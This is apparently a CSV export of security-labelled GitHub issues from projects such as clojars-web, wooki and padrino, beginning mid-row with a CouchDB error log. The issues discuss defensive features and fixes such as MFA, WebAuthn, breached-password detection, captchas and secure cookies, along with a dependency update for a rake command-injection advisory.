          {'Connection',""keep-alive""},
          {'Content-Length',""186""},
          {'Content-Type',""application/json, application/x-www-form-urlencoded""},
          {'Cookie',""AuthSession=dXNlci1ib21iYXk6NEFGMjM4QTg6Y7rR-p6-MzPTeM4rsxb7hsCkEPk""},
          {'Host',""localhost:5984""},
          {""Origin"",""file://""},
          {'User-Agent',""Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-us) AppleWebKit/531.9 (KHTML, like Gecko) Version/4.0.3 Safari/531.9""},
          {""X-Couchdb-Www-Authenticate"",""Cookie""},
          {""X-Requested-With"",""XMLHttpRequest""}]
[debug] [<0.3078.0>] request_group {Pid, Seq} {<0.113.0>,1185}
[debug] [<0.3078.0>] timeout 600
[debug] [<0.3078.0>] Successful cookie auth as: ""user-bombay""
[info] [<0.3113.0>] OS Process :: Error converting object to JSON: TypeError: toJSON.dispatcher[val.constructor.name] is not a function
[error] [<0.3078.0>] OS Process Error :: {os_process_error,""OS process timed out.""}
[debug] [<0.3078.0>] Minor error in HTTP request: {os_process_error,""OS process timed out.""}
[debug] [<0.3078.0>] Stacktrace: [{couch_db,update_doc,3},
             {couch_httpd_db,db_req,2},
             {couch_httpd_db,do_db_req,2},
             {couch_httpd,handle_request,5},
             {mochiweb_http,headers,5},
             {proc_lib,init_p_do_apply,3}]
[info] [<0.3078.0>] 127.0.0.1 - - 'POST' /wear/ 500
[debug] [<0.3078.0>] httpd 500 error response:
 {""error"":""os_process_error"",""reason"":""OS process timed out.""}

Removing the outfit validation from validate_doc_update.js, pushing the couchapp, replacing the outfit validatoin, and then pushing again seems to fix it for a while. Could be a bug in 0.11.0a.
",,no,"couch,security,"
halfbyte/jan.krutisch.de,909571637,"ðŸš¨ [security] Update rake: 0.9.2 â†’ 13.0.3 (major)","<hr>

**Welcome to Depfu** ðŸ‘‹

This is one of the first three pull requests with dependency updates we've sent your way. We tried to start with a few easy patch-level updates. Hopefully your tests will pass and you can merge this pull request without too much risk. This should give you an idea how Depfu works in general.

After you merge your first pull request, we'll send you a few more. We'll never open more than seven PRs at the same time so you're not getting overwhelmed with updates.

[Let us know](mailto:hi@depfu.com) if you have any questions. Thanks so much for giving Depfu a try!

<hr>

<hr>

ðŸš¨ <b>Your current dependencies have known security vulnerabilities</b> ðŸš¨

This dependency update fixes known security vulnerabilities. Please see the details below and assess their impact carefully. We recommend to merge and deploy this as soon as possible!
<hr>



Here is everything you need to know about this update. Please take a good look at what changed and the test results before merging this pull request.

### What changed?

#### âœ³ï¸ rake (0.9.2 â†’ 13.0.3) Â· [Repo](https://github.com/ruby/rake/tree/v13.0.1) Â· [Changelog](https://github.com/ruby/rake/blob/master/History.rdoc)

<details>
<summary>Security Advisories ðŸš¨</summary>
<h4><a href=""https://bounce.depfu.com/github.com/advisories/GHSA-jppv-gw3r-w3q8"">ðŸš¨ OS Command Injection in Rake</a></h4>
<blockquote><p>There is an OS command injection vulnerability in Ruby Rake &lt; 12.3.3 in<br>
Rake::FileList when supplying a filename that begins with the pipe character<br>
<code>|</code>.</p></blockquote>
</details>

<details>
<summary>Release Notes</summary>

<h4>13.0.3 (from changelog)</h4>
<blockquote><ul><li>
<p>Fix breaking change of execution order on TestTask. Pull request <a href=""https://bounce.depfu.com/github.com/ruby/rake/pull/368"">#368</a> by ysakasin</p>
</li></ul></blockquote>

<h4>13.0.2 (from changelog)</h4>
<blockquote><h4 id=""user-content-label-enhancements"">
<a href=""#enhancements-""></a>Enhancements<span><a href=""#label-Enhancements"">Â¶</a> <a href=""#top"">â†‘</a></span>
</h4>
<ul>
<li>
<p>Fix tests to work with current FileUtils Pull Request <a href=""https://bounce.depfu.com/github.com/ruby/rake/pull/358"">#358</a> by jeremyevans</p>
</li>
<li>
<p>Simplify default rake test loader Pull Request <a href=""https://bounce.depfu.com/github.com/ruby/rake/pull/357"">#357</a> by deivid-rodriguez</p>
</li>
<li>
<p>Update rdoc Pull Request <a href=""https://bounce.depfu.com/github.com/ruby/rake/pull/366"">#366</a> by bahasalien</p>
</li>
<li>
<p>Update broken links to rake articles from Avdi in README Pull Request <a href=""https://bounce.depfu.com/github.com/ruby/rake/pull/360"">#360</a> by svl7</p>
</li>
</ul></blockquote>
<p><em>Does any of this look wrong? <a href=""https://depfu.com/packages/rubygem/rake/feedback"">Please let us know.</a></em></p>
</details>

<details>
<summary>Commits</summary>
<p><a href=""https://github.com/ruby/rake/compare/65be0c78c84510be26e4c6abc1a3d12301f583aa...c2eeae2fe2b67170472a1441ebf84d3a238c3361"">See the full diff on Github</a>. The new version differs by 3 commits:</p>
<ul>
<li><a href=""https://github.com/ruby/rake/commit/c2eeae2fe2b67170472a1441ebf84d3a238c3361""><code>Bump version to 13.0.3</code></a></li>
<li><a href=""https://github.com/ruby/rake/commit/b6bf56c03249c215f844a6961b2ee9c98b6ffc2a""><code>Merge pull request #368 from ysakasin/fix_test_execution_order</code></a></li>
<li><a href=""https://github.com/ruby/rake/commit/37635e61ad2b663542216105ba23042f1e80683c""><code>Fix breaking change of execution order on TestTask</code></a></li>
</ul>
</details>




<hr>
<details>
<summary>ðŸ‘‰ <b>No CI detected</b></summary>
<p>You don't seem to have any Continuous Integration service set up!</p>

<p>Without a service that will test the Depfu branches and pull requests, we can't inform you if incoming updates actually work with your app. We think that this degrades the
service we're trying to provide down to a point where it is more or less meaningless.</p>

<p>This is fine if you just want to give Depfu a quick try. If you want to really let Depfu help you keep your app up-to-date, we recommend setting up a CI system:</p>

 * [Circle CI](https://circleci.com), [Semaphore ](https://semaphoreci.com) and [Travis-CI](https://travis-ci.com) are all excellent options.
 * If you use something like Jenkins, make sure that you're using the Github integration correctly so that it reports status data back to Github.
 * If you have already set up a CI for this repository, you might need to check your configuration. Make sure it will run on all new branches. If you donâ€™t want it to run on every branch, you can whitelist branches starting with `depfu/`.
</details>


---
![Depfu Status](http://golfwart.invalid/badges/9127b560ed153b4943607dfd5d5f82b8/stats.svg)

[Depfu](https://depfu.com) will automatically keep this PR conflict-free, as long as you don't add any commits to this branch yourself. You can also trigger a rebase manually by commenting with `@depfu rebase`.

<details><summary>All Depfu comment commands</summary>
<blockquote><dl>
<dt>@â€‹depfu rebase</dt><dd>Rebases against your default branch and redoes this update</dd>
<dt>@â€‹depfu recreate</dt><dd>Recreates this PR, overwriting any edits that you've made to it</dd>
<dt>@â€‹depfu merge</dt><dd>Merges this PR once your tests are passing and conflicts are resolved</dd>
<dt>@â€‹depfu close</dt><dd>Closes this PR and deletes the branch</dd>
<dt>@â€‹depfu reopen</dt><dd>Restores the branch and reopens this PR (if it's closed)</dd>
<dt>@â€‹depfu pause</dt><dd>Ignores all future updates for this dependency and closes this PR</dd>
<dt>@â€‹depfu pause [minor|major]</dt><dd>Ignores all future minor/major updates for this dependency and closes this PR</dd>
<dt>@â€‹depfu resume</dt><dd>Future versions of this dependency will create PRs again (leaves this PR as is)</dd>
</dl></blockquote>
</details>

","@depfu rebase",yes,"depfu,security,"
joestump/python-oauth2,450474,"Adding RSA SignatureMethod and test","That's pretty much it.  Uses PyCrypto if it's installed, raises NotImplementedError otherwise.
","I guess I should also mention that the patch includes unit testing
Hi @rick446! Thanks for the patch. It looks good and I'm glad to see it comes with a test. Two requests:
1. Could you add a test to ensure that verify() doesn't accept the request when it comes with a bogus signatures that wasn't actually made by the private key?
2. Could you add a test that the signature produced by your code matches the example signature  from http://wiki.oauth.net/w/page/12238556/TestCases . (If it helps you could also use these other implementations to check signatures or to generate example signatures: https://github.com/nshah/python-oauth/blob/master/oauth/signature_method/rsa_sha1.py , http://code.google.com/p/gdata-python-client/source/browse/src/gdata/oauth/rsa.py .)

Thanks again!

Regards,

Zooko
I have implemented this atop PyCrypto using X.509 certificates/public 
keys and RSA private keys in my Python implementation of OAuth 1.0.
The tests you have mentioned pass.

See: https://github.com/gorakhargosh/pyoauth/blob/master/pyoauth/protocol.py#L189

The project is at http://github.com/gorakhargosh/pyoauth/

HTH.

Cheers!
Khargosh.
",yes,"Security,Enhancement,"
apache/trafficserver,551619833,"Add better access control to XDebug plugin","The existing ""ACL"" mechanism is weak (obfuscating the header). Seeing that we've added a lot more information, some of which is sensitive, some which is computationally expensive, I feel strongly that we should add better ACL mechanisms ASAP. Being late in the game, I'm ok with postponing this until 9.1.x.

The suggestion would include

```
--allow=x-cache,x-cache-key
```
and
```
--deny=purge
```

And possibly,

```
--ip_allow=10.0.0.0-10.255.255.255 # or something like 10.0.0.0/8
```

We can discuss the default ""allowed"" fields here as well, but I think that x-cache alone is the one useful one. Also, bear in mind that a lot of this might be superseded with a new header in the future, Cache-Status:

https://tools.ietf.org/html/draft-ietf-httpbis-cache-header-02","This issue has been automatically marked as stale because it has not had recent activity. Marking it stale to flag it for further consideration by the community.",no,"Plugins,Security,Stale,"
walkscore/City-Go-Round,275824,"Improper escaping of JSON output for TransitApp","See `TransitApp::to_jsonable()`.

The ""tags"" and ""platforms"" entries in the dictionary get escaped with `cgi.escape`. This is nonsense and shouldn't be done here. HOWEVER, I was able to find code -- like in `nearby.html` for `platforms` -- that effectively assumes this escaping is done already. (I haven't found any examples of problems with the `tags` entry in the structure, and considered fixing just tags. But I'll refrain.)

This is a BAD precedent in the CGR code and must be fixed.
",,no,"bug,security,"
clojars/clojars-web,211887611,"Add captcha to new user page","We've had a few bot-created accounts lately (none of which have uploaded anything). We should try to  confirm the account is being created by a real user.

https://www.google.com/recaptcha/intro/index.html","Looking at this defect... some questions:

1. Google Identity: reCAPTCHA's API keys are tied to a Google identity - in order to create one for Clojars I'll need someone who has an official Clojars Google login of some kind. This identity/account will also receive email if Google detects problems (e.g. ""misconfiguration errors or an increase in suspicious traffic"".)
2. Type: There are two kinds reCAPTCHA V2 (easy) and Invisible reCAPTCHA (more complex.) Which kind do you want to use? I'm guessing the normal V2 type.
3. Domains: Each reCAPTCHA can cover multiple domains - which do we want protected? Just clojars.org or are there any other domains/subdomains, etc. we want covered by the same reCAPTCHA?
4. Owner Email(s): Each reCAPTCHA can have more than one owner email. Which email addresses do you want as owners?
5. Security Strength: There are three security preferences ranging from Easiest for users <---> Most secure with one midpoint.
6. Domain Name Validation: This is on by default but can be turned off. I assume you want to keep the default (on, more secure.)
7. Error reporting: Are there any requirements for this? Notify all errors via Sentry? Let Google reCAPTCHA error reporting do it's thing? I've never had it report any issues with my sites but they are low traffic so they aren't representative of what errors clarjars.org will encounter when using it.

I have several existing reCAPTCHAs and have no trouble creating one for Clojars but I really don't think you want me using my account for this. Sorry for the litany of questions but figured it is best to get all them addressed up front or switch to a different validation mechanism if there are issues.Thanks for taking a look at this Alan


>
>    1. Google Identity: reCAPTCHA's API keys are tied to a Google identity
>    - in order to create one for Clojars I'll need someone who has an official
>    Clojars Google login of some kind. This identity/account will also receive
>    email if Google detects problems (e.g. ""misconfiguration errors or an
>    increase in suspicious traffic"".)
>
I have a key created that we can start with. If we want to switch to a key
under a clojars-specific account, we can do that in the future I think.
Ping me on slack and I can get the key pair to you.

>
>    2. Type: There are two kinds reCAPTCHA V2 (easy) and Invisible
>    reCAPTCHA (more complex.) Which kind do you want to use? I'm guessing the
>    normal V2 type.
>
Agreed, let's start with V2.

>
>    3. Domains: Each reCAPTCHA can cover multiple domains - which do we
>    want protected? Just clojars.org or are there any other
>    domains/subdomains, etc. we want covered by the same reCAPTCHA?
>
Just clojars.org for now.

>
>    4. Owner Email(s): Each reCAPTCHA can have more than one owner email.
>    Which email addresses do you want as owners?
>
The key I created just emails me ATM, but I can add you as well for
testing if you like. Ideally, the owner should be contact@clojars.org, but
the form tells me that's an invalid email address for some reason. Maybe
you're not allowed a contact at the domain you are protecting? Dunno.


>    5. Security Strength: There are three security preferences ranging
>    from Easiest for users <---> Most secure with one midpoint.
>
The default appears to be the middle, so let's start there.

>
>    6. Domain Name Validation: This is on by default but can be turned
>    off. I assume you want to keep the default (on, more secure.)
>
Yes, let's keep the default.

>
>    7. Error reporting: Are there any requirements for this? Notify all
>    errors via Sentry? Let Google reCAPTCHA error reporting do it's thing? I've
>    never had it report any issues with my sites but they are low traffic so
>    they aren't representative of what errors clarjars.org will encounter
>    when using it.
>
 I guess it depends on the errors - if every auth failure is an error, I'm
fine ignoring those. I would just care about communication errors from
talking with google on the backend, and those should probably go through
sentry.

",no,"security,ready-for-work,"
clojars/clojars-web,817377209,"Support WebAuthn for Login.","WebAuthn, as defined here `https://en.wikipedia.org/wiki/WebAuthn` is a web standard used to secure authentication to web sites and services. It has been an W3C official standard since 2019. A very common example is the use of so-called security keys such as Yubico Yubikey, Google's Titan Security Key, and various other open source implementation such as Solo and so on.

WebAuthn is supported by all modern browsers, such as Firefox, Chromium, Safari, Brave and so on.

Presently, Clojars Web supports the use of 2FA via TOTP tokens - which is most excellent - for authentication to the ""admin"" area of each user's profile. 

It would be very good if, in addition to TOTP, the user had the ability to register a FIDO/FIDO2 compatible key against their profile, thus allowing users to authenticate via the security key instead of the TOTP token (the user can choose which one to authenticate by on login).

Since WebAuthn is ""built-in"" to modern browsers, the APIs are already there to implement it. 

More research would be required to determine how precisely it would fit into Clojars Web and how to properly obtain authentication against existing and new users.



","If this is up for grabs, I would give implementing this a shot next month ðŸ˜„ @JohnnyJayJay That would be great! I don't know anything about WebAuthn (other than what @dharrigan taught me above :)), but would be happy to provide any guidance needed relating to the Clojars codebase.That would be much obliged. I joined the clojars Channel on the Clojurians Slack, I'll give you a heads up there when I need assistance. At first glance, it seems like there are a lot of components that need to be adjusted to implement this.",no,"security,"
clojars/clojars-web,198894293,"Allow users to link social accounts","Jcenter has a mechanism for publicly verifying and linking social accounts and emails to their profile, so that you can see that the `danielcompton` on Clojars is the same one as the `danielcompton` on GitHub. I'm not sure if we would want to do this directly or via Keybase? Not sure how closely we want to tie ourselves to Keybase, as a VC startup, they don't have a proven long term track record or clear future.",,no,"security,ready-for-work,"
clojars/clojars-web,619806808,"Scan deployments for deploy keys/passwords","`project.clj` files are included in deployment jars, and sometimes people put the clojars password/token in the `project.clj`. We should:

* add a validation that rejects deployments that contain a credential in `project.clj`
* scan all existing artifacts for any current passwords/tokens and disable the password/token, emailing the user",,no,"security,ready-for-work,"
clojars/clojars-web,483698960,"Detect and disable weak or compromised passwords","## Context

A common attack vector for compromising the development supply chain is checking if a breached password works on other services. For example, https://news.ycombinator.com/item?id=20747283.

## Proposal

**We should look at detecting passwords that have been found in breaches and disabling them, requiring users to set a new password.** We can use [Have I Been Pwned's API](https://haveibeenpwned.com/API/v3#PwnedPasswords) to check for this. For any new signups or password changes, we should look at increasing [password length requirements](https://github.com/clojars/clojars-web/blob/46abb2bef27084f253db55eed2f4a1bb07d2c843/src/clojars/web/user.clj#L54) from 8 to 10.

**We could also proactively check the top 1,000/10,000 passwords for all Clojars users, reset any existing accounts with weak passwords, and email people if this happened.** As passwords are hashed, we'd need to run the hash algorithm against every password we check which is (by design) slow. This would be a more aggressive move, but given what is happening in other package ecosystems, seems like it could be a good proactive move.

**We get plaintext user passwords when people are deploying to Clojars, this would be another good opportunity to check if their passwords haven't been breached.** If they have, I would suggest we reset the password, include an explanation in the response, and require them to choose a new password before allowing them to deploy.

## Other thoughts

Something I'm less sure about is whether we should store if we have verified a password is not in the breached list, or whether we check the breached status every time we see a password? If we store password status `not-breached?`, we would want to store the timestamp that we checked this. This would let us avoid making the check once we know a user's password is secure.

There is some precedent for resetting user passwords, see https://github.com/clojars/clojars-web/issues/47 and https://groups.google.com/group/clojure/browse_thread/thread/5e0d48d2b82df39b for more details.

These and other Clojars security related patches _may_ be eligible for Google's [Patch Rewards](https://www.google.com/about/appsecurity/patch-rewards/) or Mozilla's [MOSS awards](https://www.mozilla.org/en-US/moss/), though as Clojure is fairly niche this is not at all clear. In it's favour, many large companies with JVM codebases have Clojars setup in Nexus/Artifactory, so a compromise of Clojars could affect the wider JVM ecosystem, not just Clojure users.","@titanous points out that if we check on every login/deploy for a compromised password, then we don't need to do any batch scanning. Either an attacker or the user trying to login with that password would be forced to reset their password first by email, which hopefully only the user has access to.",no,"security,"
clojars/clojars-web,13917532,"Check JAR/POM/DB checksums to ensure integrity over time","We should set up periodic backups of jar/pom checksums and the DB so that it's easier to confirm we haven't been affected by possible attacks in the future.
","Open to suggestions of where these should go. Since they need to be initiated from off the box, we can't really use S3; we need another independent host to perform an rsync and save off checksums.
Does ""no S3"" also mean ""no AWS""?
",no,"security,"
clojars/clojars-web,1179195739,"Require MFA group-wide","Hi again,

a usual recommendation in post-mortem analyses for high-profile incidents in npm, RubyGems, etc is that 2FA should be  required.

(I don't have the links for that at hand but that hopefully is an uncontroversial opinion)

While probably requiring MFA for everyone would be a little excessive today, being able to require MFA within a group does sound reasonable.

A simple proposal would be: if a group has MFA required, any members cannot deploy to that group until they activate MFA.

This way we can increase the security in both companies using Clojars, and OSS teams (e.g. `cider`) which have a great degree of reach.

Cheers - V","An interesting read https://blog.rubygems.org/2022/06/13/making-packages-more-secure.html",no,"security,ready-for-work,"
clojars/clojars-web,159379181,"Prevent typo squatting","http://incolumitas.com/2016/06/08/typosquatting-package-managers/
http://incolumitas.com/data/thesis.pdf

There is a thesis written about achieving RCE through typo squatting on popular package managers. The situation isn't quite so bad in Clojars as people can't copy someone else's group name, and Leiningen doesn't execute arbitrary code when JARs are downloaded (we do it at runtime ðŸ˜„). Nonetheless, we should look at the paper, identify what our risks are, and mitigate them.

c.f. http://www.nbu.gov.sk/skcsirt-sa-20170909-pypi/, https://www.pytosquatting.org","I haven't looked to see how they do it, but RubyGems has [yanked](https://github.com/rubygems/rubygems.org/wiki/Gems-yanked-and-accounts-locked#20-july-2019) gems where the names were invalid according to Levenshtein distance.",no,"security,"
clojars/clojars-web,381328178,"Allow delegation for administration to a single artifact, not just the whole group","If an open source maintainer wants to delegate admin or push rights to other maintainers, they are only able to do that at the granularity of the entire Group ID. Only being able to add to the group is not ideal, you may just want to give someone push access for a single artifact that they are maintaining, not everything in the entire group. For example, there are many artifacts under the [day8.re-frame](https://clojars.org/groups/day8.re-frame) Group ID. We may only want someone to be able to push a single artifact. Another motivating example is when someone no longer wants to maintain a particular library. They may want others to be able to push and administer a single artifact, but not everything else under their Group ID. This is the situation that [CLJ Commons](https://clj-commons.github.io) is in.

I propose that we add a new tier of permissions. Administrators of a group or project can add a user to a single project. They can add them as either an administrator or a standard user.

Adding this will need some careful thought as to how to design it securely and keep permissions understandable. There may also be other ways to achieve this goal, or perhaps this isn't a strong enough reason?

Ref: https://maven.apache.org/guides/mini/guide-relocation.html",,no,"feature,security,ready-for-work,"
spreadthesource/wooki,87523,"Provide a way to delete an account","This issue is a reminder to not forget to implement account deletion.

When deleting an account, books should be still available but user profile and linked data shouldn't be accessible anymore.

This behavior is open to discution.
","We should create an anymous author to attach the existing resources.
I would prefer something like a flag to the user model. This would offer the possibility to reopen the account later, like Facebook's account.

Deleting an account is just making it ""hidden"". The user can then reopen it and get all its data back.
What about french CNIL rules :)
The behavior I explained before could be the ""default"" way of deleting an account. We could then add a note explaining that if the user wants to permanently delete his data, he has to email the administrator or to go to a specific page.
you are right
Postponed to 0.3 for priority reasons
",no,"Security,"
spreadthesource/wooki,331023,"When user changes its username, AclCache should be cleared  ",,,no,"Security,"
spreadthesource/wooki,117995,"Enable 'remember me' service",,"Postponed to 0.3 for priority reasons
",no,"Security,"
spreadthesource/wooki,118406,"Enable OpenID/OAuth login ","This is common feature for all social websites now. We should take a look to this and maybe provide authentification based on that.
",,no,"Security,"
spreadthesource/wooki,88579,"Password recovery","We should not forget to implement this feature as well.
",,no,"Security,"
spreadthesource/wooki,88267,"Terms of service","When creating an account somewhere, there is always ""Terms of service"". We may need to incorporate some.
","Ok.
Move to 1.0 since we will provide a tool and a service after. However we can implement an entry point for people who wants to provide their own TOS.
",no,"Security,"
padrino/padrino-framework,60877451,"Make session cookies secure by default","I noticed that `enable :sessions` will set cookies with `HttpOnly` but not `Secure`. There should be a way of enabling this by default?
","Have a look in this post at Stackoverflow
http://stackoverflow.com/questions/12344088/how-to-make-rack-session-cookies-httponly
I already read that. Padrino should make it easier to enable secure sessions. Maybe check if `Rack::SSL` was added to the middleware stack.
I haven't done it yet but this is in my TODO list.
https://github.com/tobmatth/rack-ssl-enforcer
https://github.com/josh/rack-ssl
In fact, cookie without the secure attribute couldn't be transferred safely even if SSL is available.
So I basically agree with your opinion, but I worried our compatibility.
If we enable the option by default, existing project mixed of http and https will be broken.
So Iâ€™d like to suggest to provide the secure attribute as optional feature.
@namusyaka there was precedent where we opted for activating the feature instead of moving using a backward-compatible path: safe buffers.

There is the option of implementing the feature now and writing to log that it will be flipped with the next version if not explicitly set. Also, the encryption state of the connection is known through the request object, so it is possible to warn if a secure cookie goes out over a non-secure connection.
Where is this currently? I just ran into this trying to secure an updated padrino app (and esp now heroku is providing free cert mngmt for paid dynos). 

having `enable :sessions` should provide a secure option easily under the least principle of surprise and would be a great ""secure by default"" option. More to the point, trying to find documentation on this is old and outdated, which makes one slightly skittish turning on ssl in padrino (in fact, even disabling sessions and putting in rack-ssl-enforcer/rack-ssl tells me my csrf protection needs to also be disabled.). This should be way easier considering how many people are not security experts and really just wanna ""turn ssl on"" in a transparent way. 

I still continue to be floored by padrino though and the work you guys have all done. I am surprised how often i reach for it as a tool compared to rails or django these days.  =] 
@wakatara I'm not part of the team anymore, but I think most that's missing is someone having time and sending that PR :).

I don't see much opposition and I think this change makes great sense.Hehe... Fair enough. So, what needs to be done precisely, implement the rack-ssl gem solution inside the sessions that padrino uses? 

If I understand correctly (and I am by *no* means an expert on this, so please correct me if I'm wrong since I've just been reading up on it), in order to have this support ssl properly this needs two things?

1. Set and use session cookies _only_ over secure connections
2. Mark cookies as Secure so the browser doesnâ€™t transmit them when requesting a non-secure URL

Is that correct? Would this support a minimum for being able to use enable :sessions after this on ssl and having it work? I'd be willing to take a shot at it, but might need a little help since I've never waded into the framework code.
",no,"security,"
